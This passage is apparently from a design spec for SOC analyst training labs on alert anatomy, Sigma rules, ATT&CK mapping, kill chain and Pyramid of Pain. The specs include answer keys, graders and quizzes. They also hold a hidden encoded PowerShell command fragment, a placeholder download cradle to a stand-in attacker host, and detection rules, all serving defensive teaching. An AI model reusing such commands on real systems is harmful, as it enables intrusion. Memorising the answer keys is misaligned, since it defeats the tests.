    - Q3 (choice) "raw.jsonl holds a 4624 success (CM-0311-0142) the alert never cites. Why does that matter for triage?" A) it doesn't - the rule only matches failures B) it proves the alert is a false positive C) the cited evidence is incomplete - the uncited success changes the story from 'attempted' to 'succeeded' D) the SIEM dropped events → **C**.
  - `hints.json` (escalating):
    1. "Start with `jq . alert-CM-A-1024.json`. q1-q4 are answered entirely inside the alert; only q5 needs events/raw.jsonl."
    2. "q3: `jq -r '.evidence.event_ids[]' alert-CM-A-1024.json`. q4: grep each cited id in events/raw.jsonl and compare fields - user.name changes every time, one value never does. q5: which event.code means a logon SUCCEEDED?"
    3. "q5: `grep '4624' events/raw.jsonl` returns exactly one line; its event.id, lowercased, is the answer. Confirm it is NOT in evidence.event_ids - the rule only matched 4625 failures."
  - `recap.md` (3 lines, no bullet prefix):
    An alert is a claim: rule metadata says what pattern fired, and evidence.event_ids says exactly which events made it fire.
    rule.severity is static and set by the rule author; risk_score is computed per alert - never confuse the two when working a queue.
    Cited evidence can be incomplete - CM-A-1024 cites three failures but not the one success, and the success is what makes it urgent.
  - `recall.json`: none (L1.1 is the phase opener).

**EVIDENCE SPEC**

```yaml
scenario: s1-alert-anatomy            # tools/genevidence/s1-alert-anatomy.yaml; M1 spray slice
lab: L1.3
window: {start: 2026-03-11T14:00:00Z, end: 2026-03-11T14:30:00Z}   # inside scenario week
actors:
  attacker: {ip: 203.0.113.66, host: c2.stonewick.example}
  users: {sprayed_total: 42, sampled_in_events: 13 distinct (incl. d.okafor, incl. m.reyes @14:07:12Z = CM-0311-0107), success_user: m.reyes}
hosts:
  DC01: {ip: 10.20.10.5, role: ad-ds+dns, emits: windows-security-ecs-json}
  WKS-HD-03: {ip: 10.20.30.103, user: j.walsh}
benign_background:
  - {t: 2026-03-11T14:11:47Z, event_id: CM-0311-0119, desc: j.walsh local password typo, emit: 1x 4625 src 10.20.30.103}
attacker_actions:
  - {t: 2026-03-11T14:05:12Z..14:21:58Z, action: password-spray OWA -> DC01 auth failures, src: 203.0.113.66,
     emit: 13x 4625 (event ids sparse in CM-0311-0101..CM-0311-0139), cited: [CM-0311-0107, CM-0311-0121, CM-0311-0135]}
  - {t: 2026-03-11T14:22:31Z, action: sprayed password succeeds for m.reyes, src: 203.0.113.66,
     emit: 1x 4624 logon-type 3, event_id: CM-0311-0142, cited: false}
emit:
  - {artifact: siem-alert CM-A-1024 (rule CM-R-0117 v3, severity high, risk_score 73, TA0006/T1110.003,
     fired 2026-03-11T14:26:04Z, status new, evidence.event_ids = cited list above), path: files/alert-CM-A-1024.json}
  - {artifact: ecs security events, 15 lines chronological, path: files/events/raw.jsonl}
  - {artifact: static answers template q1-q5, path: files/answers.template.txt}
answer_key:                           # generator embeds these base64 into check.sh between GENERATED KEY markers
  q1: cm-r-0117
  q2: rule.severity
  q3: cm-0311-0107,cm-0311-0121,cm-0311-0135
  q4: 203.0.113.66
  q5: cm-0311-0142
verify:                               # consistency-verifier invariants
  - evidence.event_ids is a strict subset of raw.jsonl event ids
  - CM-0311-0142 exists in raw.jsonl with event.code 4624 and is absent from evidence.event_ids
  - all timestamps inside window; source.ip is the only IP-typed field in raw.jsonl lines (keeps q4 unique)
```

### L1.4 - Reading a Sigma rule - logsource, detection block, condition (your DaC world, from the consumer side)

| id | title | type | gate | est_minutes |
|----|-------|------|------|-------------|
| L1.4 | Reading a Sigma rule - logsource, detection block, condition (your DaC world, from the consumer side) | DECODE | false | 15 |

**TEACHING ARTIFACT**

- **Files staged** (`files/`):
  - `rule-encoded-powershell.yml` — real Sigma YAML, verbatim: `title: Suspicious Encoded PowerShell Command Line`; `id: 6f9d3a2e-4b1c-4c8e-9a7d-2f0e5b8c1d43`; `status: test`; `description: Detects powershell.exe launched with an encoded command, excluding the Veeam backup service parent.`; `author: Coppermine Detection Engineering`; `date: 2026-02-20`; `logsource: {product: windows, category: process_creation}`; `detection:` with `selection_img: {Image|endswith: '\powershell.exe'}`, `selection_cli: {CommandLine|contains: '-enc'}`, `filter_backup: {ParentImage|endswith: '\veeam.backup.svc.exe'}`, `condition: selection_img and selection_cli and not filter_backup`; `falsepositives: [Admin scripts passing encoded commands, Backup software wrappers]`; `level: high`; `tags: [attack.execution, attack.t1059.001]`. Answer-bearing lines: the `condition:` line (q1–q4 logic), the `filter_backup` key name (q5), the `Image|endswith` value (q6).
  - `candidates.jsonl` — 4 normalized SIEM events (ECS JSON, one per line, chronological), generated from scenario `s1-sigma-read`:
    - line 1, **e2** `CM-0311-0021` 2026-03-11T02:00:41Z, `event.dataset:sysmon`, `event.code:"1"`, host SRV-BACKUP, user svc_backup, `process.parent.executable: C:\Program Files\Veeam\Backup\veeam.backup.svc.exe`, `process.executable: ...\powershell.exe`, `process.command_line: powershell.exe -enc <b64 of "& C:\Scripts\backup-verify.ps1">` → key **n** (filter_backup suppresses).
    - line 2, **e1** `CM-0311-0201` 2026-03-11T15:41:07Z (motif M2), host WKS-ACCT-07, user m.reyes, parent `...\Office16\WINWORD.EXE`, executable `...\WindowsPowerShell\v1.0\powershell.exe`, command_line `powershell.exe -nop -w hidden -enc <b64 of UTF-16LE cradle fetching hxxp from cdn.stonewick.example — raw file NOT defanged>` → key **y**.
    - line 3, **e3** `CM-0312-0233` 2026-03-12T09:03:12Z (motif M3), `event.dataset:zeek.dns`, source.ip 10.20.31.112 (WKS-ENG-12), TXT query `<random-label>.tun.stonewick.example`, rcode NXDOMAIN → key **n** (wrong logsource: not windows/process_creation, fields never tested).
    - line 4, **e4** `CM-0312-0301` 2026-03-12T13:15:02Z, host WKS-ENG-12, user d.okafor, parent `C:\Windows\explorer.exe`, `process.executable: C:\Program Files\PowerShell\7\pwsh.exe`, command_line `pwsh.exe -nop -enc <b64 of "Get-ChildItem env:">` → key **n** (`Image|endswith '\powershell.exe'` misses pwsh.exe; selection_cli alone is not enough).
  - `answers.template.txt` — comment header maps qN→event id, then `q1=` … `q6=` lines.
  - Field-map note lives in lab.md GUIDED STEPS (3 lines): Sigma `Image` = ECS `process.executable`, `CommandLine` = `process.command_line`, `ParentImage` = `process.parent.executable`; candidates.jsonl is the post-normalization feed, so JSON even for the zeek-sourced event.
- **Learner task**: read the rule top-down (logsource → named blocks → condition), evaluate it by hand against each candidate event, copy template to `answers.txt` and fill:
  ```
  # q1-q4: does the rule fire on this event? y or n
  # q1=CM-0311-0201  q2=CM-0311-0021  q3=CM-0312-0233  q4=CM-0312-0301
  q1=            # y|n
  q2=            # y|n
  q3=            # y|n
  q4=            # y|n
  q5=            # exact detection-map key name that excluded q2's event
  q6=            # executable basename selection_img would need added for q4's event to match
  ```
  Keyed values: q1=`y` q2=`n` q3=`n` q4=`n` q5=`filter_backup` q6=`pwsh.exe`.
- **Grading** (`check.sh`, sources `$LAB_CHECKLIB`, collect-all):
  1. `assert_file_exists answers.txt`
  2. Normalize (plain bash, Section 2.1 recipe — includes `sed 's/#.*//'` so the template's inline `# y|n` comments can never break a correct answer): `tr 'A-Z' 'a-z' < answers.txt | sed 's/#.*//' | tr -d '[:space:]' > .answers.norm`
  3. Generated key block (base64 constants K1..K6 decoding to y,n,n,n,filter_backup,pwsh.exe) between `# --- BEGIN GENERATED KEY (genevidence: s1-sigma-read) ---` / `# --- END GENERATED KEY ---`
  4. Six anchored-ERE checks, dots escaped, values from decoded constants: `assert_file_contains .answers.norm "^q1=y$"` … `"^q4=n$"`, `"^q5=filter_backup$"`, `"^q6=pwsh\.exe$"`
  5. `ck_summary`
- **Kit files**:
  - `meta.json`: `{id:"L1.4", title:<map title>, type:"DECODE", objective:"Read a Sigma rule as its consumer: logsource scoping, named detection blocks, and the condition line — and predict exactly which events it fires on.", gate:false, est_minutes:15}`
  - `quiz.json` (3, choice, answers base64):
    1. "In `condition: selection_img and selection_cli and not filter_backup`, an event matching ALL THREE named blocks…" a) fires the rule b) does not fire c) fires at reduced level d) fires only if status is stable → **b**
    2. "What does the `logsource` block do?" a) documentation only b) scopes which event stream the detection fields are even tested against — wrong stream means no match regardless of field values c) sets alert severity d) declares the ATT&CK technique → **b**
    3. "An alert from this rule arrives with `level: high`. That means…" a) it is a confirmed true positive b) it is the author's severity estimate for the behavior if real — the triage verdict is still yours to make c) the SIEM auto-escalates it to Tier 2 d) the telemetry source is high-fidelity → **b**
  - `hints.json`: L1 "Read the rule top-down: logsource first (which stream is this rule even allowed to see?), then each named detection block, then the one condition line that combines them. One candidate event is not even from the right stream." L2 "Map fields before matching: Image=process.executable, CommandLine=process.command_line, ParentImage=process.parent.executable. The condition needs BOTH selections true AND the filter false — check q2's parent path and q4's executable basename character by character." L3 "Only the WINWORD→powershell event fires (q1=y, rest n). q2's event matches both selections but its parent ends in \veeam.backup.svc.exe, so the named key filter_backup suppresses it (q5). q4's binary ends in pwsh.exe, which '\powershell.exe' can never match — that basename is q6."
  - `recap.md` (3 lines, no bullets): "A Sigma rule reads top-down: logsource scopes the stream, named detection blocks test fields, and one condition line combines them — an event from the wrong stream never reaches the field tests." / "`and not <filter>` is how detection engineers carve out known-good; an event a filter suppresses was seen and excused, which is the seed of the BTP verdict you meet in L1.7." / "`level:` is the author's severity estimate, never a verdict, and brittle selectors (powershell.exe but not pwsh.exe) are exactly why rules get tuned."
  - No `recall.json` (phase opener is L1.1).

**EVIDENCE SPEC**

```yaml
scenario: s1-sigma-read            # tools/genevidence/s1-sigma-read.yaml
lab: L1.4
window: {start: 2026-03-09T00:00:00Z, end: 2026-03-13T23:59:59Z}
actors: [m.reyes, svc_backup, d.okafor]
hosts: {WKS-ACCT-07: 10.20.30.107, SRV-BACKUP: 10.20.10.9, WKS-ENG-12: 10.20.31.112}
attacker: {payload_host: {ip: 198.51.100.23, fqdn: cdn.stonewick.example},
           dns_tunnel_zone: tun.stonewick.example}
static_inputs:
  sigma_rule: rule-encoded-powershell.yml   # copied verbatim to files/ AND parsed by generator
benign_background:
  - {id: CM-0311-0021, t: 2026-03-11T02:00:41Z, kind: sysmon_proc, host: SRV-BACKUP,
     user: svc_backup, parent: 'C:\Program Files\Veeam\Backup\veeam.backup.svc.exe',
     image: '...\powershell.exe', cmdline: 'powershell.exe -enc <b64: & C:\Scripts\backup-verify.ps1>'}
  - {id: CM-0312-0301, t: 2026-03-12T13:15:02Z, kind: sysmon_proc, host: WKS-ENG-12,
     user: d.okafor, parent: 'C:\Windows\explorer.exe',
     image: 'C:\Program Files\PowerShell\7\pwsh.exe', cmdline: 'pwsh.exe -nop -enc <b64: Get-ChildItem env:>'}
attacker_actions:
  - {id: CM-0311-0201, t: 2026-03-11T15:41:07Z, kind: sysmon_proc, motif: M2, host: WKS-ACCT-07,
     user: m.reyes, parent: '...\Office16\WINWORD.EXE', image: '...\WindowsPowerShell\v1.0\powershell.exe',
     cmdline: 'powershell.exe -nop -w hidden -enc <b64 UTF-16LE download cradle -> cdn.stonewick.example>'}
  - {id: CM-0312-0233, t: 2026-03-12T09:03:12Z, kind: zeek_dns, motif: M3, src: 10.20.31.112,
     query: '<rand24>.tun.stonewick.example', qtype: TXT, rcode: NXDOMAIN}
emit:
  - candidates.jsonl <- all 4 events, ECS-normalized JSONL, chronological
  - rule-encoded-powershell.yml <- static_inputs.sigma_rule, verbatim
answer_key:   # generator EVALUATES the parsed rule (logsource + detection + condition)
              # against each emitted event; key can never drift from rule text
  q1: y             # CM-0311-0201
  q2: n             # CM-0311-0021 — suppressed by filter_backup
  q3: n             # CM-0312-0233 — logsource mismatch (zeek.dns)
  q4: n             # CM-0312-0301 — Image|endswith '\powershell.exe' misses pwsh.exe
  q5: filter_backup
  q6: pwsh.exe
```

### L1.5 - MITRE ATT&CK - tactics vs techniques; mapping an alert to a technique ID

| id | title | type | gate | est_minutes |
|----|-------|------|------|-------------|
| L1.5 | MITRE ATT&CK - tactics vs techniques; mapping an alert to a technique ID | TOUR | false | 15 |

**TEACHING ARTIFACT**

Files staged (`files/`):
- `attack-excerpt.json` - curated static mini-reference (NO live ATT&CK fetch at build; table lives verbatim in the scenario yaml). JSON array of 10 objects `{tid,name,tactic,parent}` (this is the shared schema — L1.8 later ships an extended superset of this same file, same field names), all values lowercase, `parent:null` for parent techniques: `t1110`/brute force/credential-access/null; `t1110.001`/password guessing/credential-access/t1110; `t1110.003`/password spraying/credential-access/t1110; `t1059`/command and scripting interpreter/execution/null; `t1059.001`/powershell/execution/t1059; `t1071`/application layer protocol/command-and-control/null; `t1071.004`/dns/command-and-control/t1071; `t1048.003`/exfiltration over unencrypted non-c2 protocol/exfiltration/t1048; `t1566.001`/spearphishing attachment/initial-access/t1566; `t1547.001`/registry run keys - startup folder/persistence/t1547. Answer-bearing fields: `tid` of matched rows (q1-q3), `tactic` of the t1110.003 row (q4), `parent` of the t1110.003 row (q5). `t1110.001` and `t1048.003` are deliberate near-miss distractors.
- `alerts.jsonl` - 3 one-line SIEM alerts in the standard alert shape (`alert.id`, `@timestamp`, `rule:{id,name,version,severity,risk_score,threat:{tactic,technique}}`, `entities`, `evidence:{event_ids,query}`, `status:"new"`), with `rule.threat.tactic` AND `rule.threat.technique` both set to `"UNMAPPED"` (learner maps in answers.txt; stub file is never edited). Raw evidence, not defanged:
  - `CM-A-31` @2026-03-11T14:25:00Z, rule.name "Auth: password failures across 40+ accounts from single source", entities `{src_ip:"203.0.113.66", success_user:"m.reyes"}`, event_ids `[CM-0311-0140, CM-0311-0142]` (M1)
  - `CM-A-32` @2026-03-11T15:41:22Z, rule.name "Endpoint: office app spawned hidden encoded interpreter", entities `{host:"WKS-ACCT-07", user:"m.reyes", parent_image:"WINWORD.EXE", cmdline:"powershell.exe -nop -w hidden -enc JAB..."}`, event_ids `[CM-0311-0201]` (M2)
  - `CM-A-33` @2026-03-12T09:06:00Z, rule.name "Network: periodic high-entropy TXT queries to single zone (command channel)", entities `{host:"WKS-ENG-12", zone:"tun.stonewick.example", qtype:"TXT", period_s:300}`, event_ids `[CM-0312-0033]` (M3; "periodic command channel" wording disambiguates C2-over-DNS t1071.004 from exfil t1048.003)
- `answers.template.txt` (learner copies to `answers.txt`):

```
# single lowercase tokens; technique ids like t1110.003; tactic slugs exactly as in attack-excerpt.json
q1=   # CM-A-31: most specific technique id
q2=   # CM-A-32: most specific technique id
q3=   # CM-A-33: most specific technique id
q4=   # tactic slug of your q1 technique
q5=   # parent technique id of your q1 technique
```

- `layer-sample.json` - static minimal Navigator layer: `{name:"coppermine demo", domain:"enterprise-attack", versions:{attack:"16",navigator:"5.1.0",layer:"4.5"}, techniques:[{techniqueID:"T1110.003", score:1}]}` - lets walkthrough step 6 work offline.

Learner task: do the web walkthrough (below; the tour is the experience, but ALL grading is offline against staged files - offline learners skip straight to the mapping), then fill `answers.txt` using `attack-excerpt.json` + `jq`/`grep`. Tour destination URLs stay clickable in lab.md (defanging applies to attacker indicators in prose, not to benign tour destinations).

Walkthrough path:
1. Open `https://attack.mitre.org` -> Matrices -> Enterprise. Columns = tactics (adversary's WHY; TA-ids, e.g. Credential Access = TA0006); cells = techniques (the HOW; T-ids).
2. Click the Credential Access column, then "Brute Force (T1110)". Note the 4 sub-techniques T1110.001-.004 in the left sidebar.
3. Open T1110.003 Password Spraying. Locate the analyst-relevant sections: Procedure Examples, Data Sources (right metadata box), Detection.
4. Open `https://mitre-attack.github.io/attack-navigator` -> Create New Layer -> Enterprise ATT&CK.
5. In Navigator: magnifier (search) -> type "password spraying" -> select -> set score 1 via the scoring control; observe the highlighted cell under Credential Access and that selection works per tactic column.
6. Optional: layer controls -> export -> "download layer as json"; compare its structure to staged `layer-sample.json` (offline: just read `layer-sample.json`).

Comprehension questions (full set): the 5 graded mapping questions q1-q5 (answers.txt template above, keyed in Grading) + the 3 quiz.json questions below. No other questions.

Grading (`check.sh`; keys embedded as base64 between `# --- BEGIN GENERATED KEY (genevidence: s1-attack-map) ---` / `# --- END GENERATED KEY ---`, decoded to K1..K5 at runtime):
1. `assert_file_exists attack-excerpt.json`; `assert_file_exists alerts.jsonl` (workspace intact)
2. `assert_file_exists answers.txt`
3. Normalize once (plain bash, Section 2.1 recipe) to `.answers.norm`; then for N=1..5: `assert_file_contains ".answers.norm" "^qN=<KN>$"` (KN = decoded key, `.` escaped). Decoded keys: K1=`t1110.003` K2=`t1059.001` K3=`t1071.004` K4=`credential-access` K5=`t1110`
4. `ck_summary`

Kit files:
- `meta.json`: `{id:"L1.5", title:"MITRE ATT&CK - tactics vs techniques; mapping an alert to a technique ID", type:"TOUR", objective:"Tell tactics from techniques from sub-techniques and map three Coppermine alerts to ATT&CK technique ids", gate:false, est_minutes:15}`
- `lab.md`: "## BRIEF" (<=10 lines: ATT&CK = shared vocabulary for adversary behavior; tactic=why, technique=how, sub-technique=specific how; Coppermine alerts carry technique ids so any analyst knows what behavior fired; attacker names defanged, e.g. tun.stonewick[.]example) + "## GUIDED STEPS" (walkthrough steps 1-6, then the mapping task and answers.txt instructions).
- `quiz.json` (exactly 3; answers base64 at build):
  - Q1 (choice) "In the Enterprise Matrix, a column such as Credential Access (TA0006) is a:" a) technique b) tactic - the adversary's goal c) sub-technique d) data source -> key `b`
  - Q2 (choice) "Why map an alert to a technique id instead of the tool name (e.g. 'powershell.exe')?" a) technique ids are shorter b) tools are cheap to swap, behavior is not - technique ids survive tool changes c) MITRE requires it d) tool names are case-sensitive -> key `b`
  - Q3 (text) "Which named section of a technique page tells a defender what telemetry can reveal the technique — stated verbatim in GUIDED STEPS step 2 as 'Detection'?" -> key `detection`, accept_b64 variants `detections`, `detection strategies`
- `hints.json` (3 escalating):
  - L1: "Tactic = why, technique = how. In attack-excerpt.json a sub-technique has a non-null parent field. Match each alert to the behavior it describes, not to the tool named in it."
  - L2: "CM-A-31 = one source, many accounts, few passwords - look under Brute Force and pick the right sub-technique. CM-A-32: the interpreter is the technique. CM-A-33 says 'periodic command channel' - that is C2 over a protocol, not exfiltration. q4/q5 come straight from the tactic and parent fields of your q1 row."
  - L3: "q1=t1110.003 (spraying, not .001 guessing), q2=t1059.001, q3=t1071.004 (not t1048.003 - the stub describes a command channel), q4=credential-access, q5=t1110."
- `recap.md` (3 lines, no bullet prefix):
  Tactics are the adversary's why (TA-ids, matrix columns); techniques and sub-techniques are the how (T-ids, cells).
  Map alerts to the most specific technique the evidence supports: password spraying is t1110.003, not just t1110.
  Map behavior, not tools - powershell.exe in an alert means t1059.001 because behavior is expensive for attackers to change.
- No `recall.json` (not a phase opener).

**EVIDENCE SPEC**
```yaml
scenario: s1-attack-map
lab: L1.5
window: {start: 2026-03-11T14:00:00Z, end: 2026-03-12T10:00:00Z}   # inside scenario week
actors: {m.reyes: WKS-ACCT-07/10.20.30.107, d.okafor: WKS-ENG-12/10.20.31.112}
attacker: {c2_ip: 203.0.113.66, c2_host: c2.stonewick.example, tunnel_zone: tun.stonewick.example}
benign_background: none   # alert-stub lab; no raw logs shipped, so no benign noise needed
static_tables:            # emitted verbatim by generator; curated at authoring time, never fetched live
  attack_excerpt: 10 rows exactly as listed under Files staged -> files/attack-excerpt.json
  layer_sample: minimal navigator layer (T1110.003, score 1)   -> files/layer-sample.json
attacker_actions:
  - {ts: 2026-03-11T14:22:31Z, motif: M1, action: spray success m.reyes from 203.0.113.66,
     alert: CM-A-31, alert_ts: 2026-03-11T14:25:00Z, event_ids: [CM-0311-0140, CM-0311-0142]}
  - {ts: 2026-03-11T15:41:22Z, motif: M2, action: WINWORD.EXE spawns powershell -nop -w hidden -enc,
     host: WKS-ACCT-07, alert: CM-A-32, alert_ts: 2026-03-11T15:41:22Z, event_ids: [CM-0311-0201]}
  - {ts: 2026-03-12T09:04:10Z, motif: M3, action: high-entropy TXT burst under tun.stonewick.example,
     host: WKS-ENG-12, alert: CM-A-33, alert_ts: 2026-03-12T09:06:00Z, event_ids: [CM-0312-0033]}
emit:
  alerts: files/alerts.jsonl        # 3 stubs; rule.threat.{tactic,technique} = "UNMAPPED"
  excerpt: files/attack-excerpt.json
  layer: files/layer-sample.json
  key: check.sh generated-key block (base64)
answer_key: {q1: t1110.003, q2: t1059.001, q3: t1071.004, q4: credential-access, q5: t1110}
```

### L1.6 - Kill chain & Pyramid of Pain - where an alert sits, what an indicator costs the attacker
| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L1.6 | Kill chain & Pyramid of Pain - where an alert sits, what an indicator costs the attacker | DECODE | false | 15 |

**TEACHING ARTIFACT**
- **Files staged** (`tracks/soc/phases/p1/L1.6-killchain-pyramid/files/` -> `workspace/soc/L1.6/`):
  - `incident-brief.md` — GENERATED, DEFANGED prose (~14 lines): 1 title line ("Coppermine IR summary — WKS-ACCT-07, 2026-03-11"), then 7 letter-tagged beats, one per beat, format `[X] <ISO ts> — <prose>`. Stage names NEVER appear in the brief (they are the answers). Beats: [A] 2026-03-09T13:05:00Z whois shows copperm1ne-billing[.]example newly registered; [B] 2026-03-10T18:40:00Z doc metadata dates the macro project build of invoice_2026-03.docm (attacker side); [C] 2026-03-11T15:02:00Z phish from billing@copperm1ne-billing[.]example (sender IP 198.51.100.71) lands in m.reyes's inbox with the .docm; [D] 15:41:07Z macros enabled, WINWORD.EXE spawns `powershell.exe -nop -w hidden -enc ...`, stage-2 pulled from hxxps://cdn.stonewick[.]example/; [E] 15:41:20Z HKCU Run-key value set; [F] 15:46:02Z beacon every 300s +/-10% to c2.stonewick[.]example (203.0.113.66:443); [G] 16:32:00Z AP invoice files staged to \\FS01\finance. Answer-carrying beats: B (q1), D (q2), E (q3).
  - `indicators.csv` — GENERATED, RAW (never defanged), header `id,indicator_type,value,first_seen_in_incident` (scoped to this WKS-ACCT-07 incident, not global first-ever sighting), 6 rows: `i1,sha256,<64-hex of canonical seeded M2 docm stub>,2026-03-11T15:02:00Z`; `i2,ip,203.0.113.66,2026-03-11T15:46:02Z`; `i3,domain,c2.stonewick.example,2026-03-11T15:46:02Z`; `i4,filename,invoice_2026-03.docm,2026-03-11T15:02:00Z`; `i5,user-agent,Mozilla/5.0 (WindowsPowerShell/5.1),2026-03-11T15:41:05Z`; `i6,behavior,Office parent spawning powershell with -enc,2026-03-11T15:41:07Z`. Answer-carrying rows: i1 (q4), i3 (q5), i5 (q6), i6 (q7).
  - `answers.template.txt` — static:
    ```
    # kill-chain stage vocab: recon|weaponization|delivery|exploitation|installation|c2|actions
    # q1: stage of beat B   q2: stage of beat D   q3: stage of beat E
    q1=
    q2=
    q3=
    # pyramid vocab: trivial|easy|simple|annoying|challenging|tough
    # q4: level of row i1   q5: level of row i3   q6: level of row i5
    q4=
    q5=
    q6=
    # q7: row id (i1..i6) that costs the attacker MOST to replace
    q7=
    ```
- **Learner task**: read `incident-brief.md`, classify beats B/D/E onto the kill chain; read `indicators.csv`, rate rows i1/i3/i5 on the Pyramid of Pain; pick the highest-pain row for q7. `cp answers.template.txt answers.txt`, fill values (single lowercase tokens from the vocab lines), run the lab check. Grammar: q1-q3 in {recon,weaponization,delivery,exploitation,installation,c2,actions}; q4-q6 in {trivial,easy,simple,annoying,challenging,tough}; q7 in {i1..i6}.
- **Grading** (`check.sh`, sources `$LAB_CHECKLIB`; key block between `# --- BEGIN GENERATED KEY (genevidence: s1-killchain) ---` / END markers holds `KEY_Q1..KEY_Q7` as base64):
  1. `assert_file_exists answers.txt`
  2. Normalize once (plain bash, Section 2.1 recipe) to `.answers.norm`; then for N in 1..7: `assert_file_contains ".answers.norm" "^qN=<decoded KEY_QN>$"` (collect-all; failure names only qN, never the key).
  3. `ck_summary` (last line).
  Decoded key values (must match answer_key below verbatim): q1=`weaponization` q2=`exploitation` q3=`installation` q4=`trivial` q5=`simple` q6=`annoying` q7=`i6`.
- **Kit files**:
  - `meta.json`: `{"id":"L1.6","title":"Kill chain & Pyramid of Pain - where an alert sits, what an indicator costs the attacker","type":"DECODE","objective":"Place incident beats on the kill chain and rate indicators by attacker replacement cost","gate":false,"est_minutes":15}`
  - `lab.md`: `## BRIEF` (max 10 lines) defines both models: 7 kill-chain stages in one line each pair (recon=learning about you, weaponization=building the payload off-network, delivery=payload reaches you, exploitation=code runs, installation=survives reboot, c2=attacker channel, actions=the actual goal) and the pyramid ladder hash->trivial, ip->easy, domain->simple, host/network artifact->annoying, tool->challenging, ttp/behavior->tough, plus the rule of thumb "level = attacker's cost to change it, not your cost to detect it". `## GUIDED STEPS`: 1) `cat incident-brief.md`; 2) `column -t -s, indicators.csv`; 3) copy template to `answers.txt`, fill q1-q7; 4) run the check.
  - `quiz.json` (3 questions, answers base64; text answers normalized lowercase/trim/collapse):
    - Q1 (choice) "Your SOC blocks the sha256 of invoice_2026-03.docm. Why is that trivial pain for the attacker?" a) hash blocklists only apply on Windows b) changing one byte of the file yields a brand-new hash, so re-blocking never ends c) sha256 can be reversed to rebuild the file d) hashes expire after 30 days -> **b**
    - Q2 (text) "Beats A and B happen on attacker infrastructure. What is the EARLIEST kill-chain stage Coppermine's own telemetry can see in this incident? (one word)" -> **delivery**
    - Q3 (choice) "Detection tuning gets one engineering hour. Per the pyramid, which change hurts this attacker most?" a) add the new sha256 to the blocklist b) block 203.0.113[.]66 at the firewall c) keep and tune the rule for Office spawning powershell with -enc d) add the filename invoice_2026-03.docm to the mail filter -> **c**
  - `hints.json`: L1 "For each beat ask 'what is the attacker DOING at this instant', not 'what tool shows up'. For each indicator ask what it would cost the ATTACKER to swap it, not how hard it is for you to spot." L2 "Beats that happen entirely off Coppermine's network sit before delivery; the Run key is about surviving reboot, not about code first running. On the pyramid, strings an attacker edits in a config (filenames, user-agents) sit one band, habits of how they operate sit at the top." L3 "Beat B is payload construction = weaponization; D is code executing = exploitation; E is persistence = installation. i1 is a hash (trivial), i3 a domain (simple), i5 a network artifact (annoying); the row they would have to retrain themselves to replace is the behavior row."
  - `recap.md` (3 lines, no bullets): `The kill chain names what the attacker is doing at each beat: recon, weaponization, delivery, exploitation, installation, c2, actions.` / `The Pyramid of Pain ranks indicators by the attacker's cost to replace them: hash trivial, ip easy, domain simple, artifact annoying, tool challenging, ttp tough.` / `Tune upward: a behavior detection like Office spawning powershell -enc outlives every hash and domain block you will ever write.`
  - No `recall.json` (L1.1 is the phase opener).

**EVIDENCE SPEC**
```yaml
scenario: s1-killchain            # tools/genevidence/s1-killchain.yaml
lab: L1.6
window: {start: "2026-03-09T00:00:00Z", end: "2026-03-13T23:59:59Z"}
actors:
  victim: {user: m.reyes, host: WKS-ACCT-07, ip: 10.20.30.107}
  staging_target: {host: FS01, ip: 10.20.10.8}
attacker: {c2_ip: 203.0.113.66, c2_domain: c2.stonewick.example,
           payload_host: cdn.stonewick.example, sender_ip: 198.51.100.71,
           typosquat: copperm1ne-billing.example}
benign_background: []             # narrative+CSV lab; no raw log streams emitted
attacker_actions:                 # -> brief beats A-G; generator defangs all prose output
  - {tag: A, stage: recon,         ts: "2026-03-09T13:05:00Z", note: typosquat registered (whois)}
  - {tag: B, stage: weaponization, ts: "2026-03-10T18:40:00Z", note: macro doc built, attacker side}
  - {tag: C, stage: delivery,      ts: "2026-03-11T15:02:00Z", note: phish + .docm to m.reyes}
  - {tag: D, stage: exploitation,  ts: "2026-03-11T15:41:07Z", note: WINWORD -> powershell -enc}
  - {tag: E, stage: installation,  ts: "2026-03-11T15:41:20Z", note: HKCU Run key set}
  - {tag: F, stage: c2,            ts: "2026-03-11T15:46:02Z", note: 300s +/-10% beacon to c2 :443}
  - {tag: G, stage: actions,       ts: "2026-03-11T16:32:00Z", note: staging to FS01 finance share}
indicators:                       # -> indicators.csv rows, RAW
  - {id: i1, type: sha256, value: sha256(canonical seeded M2 docm stub), level: trivial,
     first_seen: "2026-03-11T15:02:00Z"}   # deterministic; shared constant for all M2 labs
  - {id: i2, type: ip,         value: 203.0.113.66,               level: easy,     first_seen: "2026-03-11T15:46:02Z"}
  - {id: i3, type: domain,     value: c2.stonewick.example,       level: simple,   first_seen: "2026-03-11T15:46:02Z"}
  - {id: i4, type: filename,   value: invoice_2026-03.docm,       level: annoying, first_seen: "2026-03-11T15:02:00Z"}
  - {id: i5, type: user-agent, value: "Mozilla/5.0 (WindowsPowerShell/5.1)", level: annoying, first_seen: "2026-03-11T15:41:05Z"}
  - {id: i6, type: behavior,   value: Office parent spawning powershell with -enc, level: tough, first_seen: "2026-03-11T15:41:07Z"}
emit:
  - {artifact: brief,      path: files/incident-brief.md}   # defanged prose from attacker_actions
  - {artifact: indicators, path: files/indicators.csv}      # raw CSV from indicators
  - {artifact: key_block,  path: check.sh}                  # base64 KEY_Q1..KEY_Q7 between markers
answer_key: {q1: weaponization, q2: exploitation, q3: installation,
             q4: trivial, q5: simple, q6: annoying, q7: i6}
```
No PCAP/log streams needed: the single concept is classification against two mental models, and the brief+CSV are still generator-emitted from `s1-killchain.yaml` so beats, indicator rows, and the check.sh key block share one source of truth.

### L1.7 - The disposition taxonomy - true positive, false positive, benign true positive, with mini-cases

| id | title | type | gate | est_minutes |
|----|-------|------|------|-------------|
| L1.7 | The disposition taxonomy - true positive, false positive, benign true positive, with mini-cases | TRIAGE | false | 20 |

**TEACHING ARTIFACT**

- **Files staged** (`files/`):
  - `cases/c1/alert.json` — SIEM alert `CM-A-11`, rule `CM-R-0117 "Password Spray - Many Accounts, One Source"` (same rule id as L1.3), severity high, technique T1110.003, `entities.source.ip: 203.0.113.66`, `evidence.event_ids: [CM-0311-0138, CM-0311-0139, CM-0311-0140, CM-0311-0142, CM-0311-0143]`.
